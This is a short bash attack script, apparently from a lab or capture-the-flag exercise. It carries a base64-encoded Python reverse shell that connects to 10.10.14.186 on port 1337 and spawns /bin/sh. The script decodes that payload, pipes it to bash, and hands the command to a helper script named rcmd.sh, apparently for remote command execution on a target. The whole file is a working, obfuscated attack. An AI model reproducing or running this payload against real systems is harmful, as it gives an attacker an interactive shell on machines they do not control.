#!/bin/bash

rshell_b64="cHl0aG9uMyAtYyAnYT1fX2ltcG9ydF9fO3M9YSgic29ja2V0Iikuc29ja2V0O289YSgib3MiKS5kdXAyO3A9YSgicHR5Iikuc3Bhd247Yz1zKCk7Yy5jb25uZWN0KCgiMTAuMTAuMTQuMTg2IiwxMzM3KSk7Zj1jLmZpbGVubztvKGYoKSwwKTtvKGYoKSwxKTtvKGYoKSwyKTtwKCIvYmluL3NoIikn"
cmd="echo ${rshell_b64} | base64 -d | bash"

./rcmd.sh "${cmd}"
